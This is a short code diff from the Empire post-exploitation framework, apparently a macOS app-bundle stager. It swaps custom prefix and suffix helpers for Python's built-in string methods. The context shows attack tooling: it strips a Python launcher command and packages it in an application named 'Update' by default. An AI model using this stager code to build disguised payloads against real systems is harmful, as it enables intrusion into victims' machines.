@@ -1,5 +1,4 @@
 from empire.server.common import helpers
-from empire.server.utils.string_util import removeprefix, removesuffix
 
 
 class Stager:
@@ -92,8 +91,8 @@ class Stager:
         if app_name == "":
             app_name = "Update"
         disarm = True
-        launcher_code = removeprefix(launcher, "echo ")
-        launcher_code = removesuffix(launcher_code, " | python3 &")
+        launcher_code = launcher.removeprefix("echo ")
+        launcher_code = launcher_code.removesuffix(" | python3 &")
         launcher_code = launcher_code.strip('"')
         application_zip = self.mainMenu.stagergenv2.generate_appbundle(
             launcher_code=launcher_code,
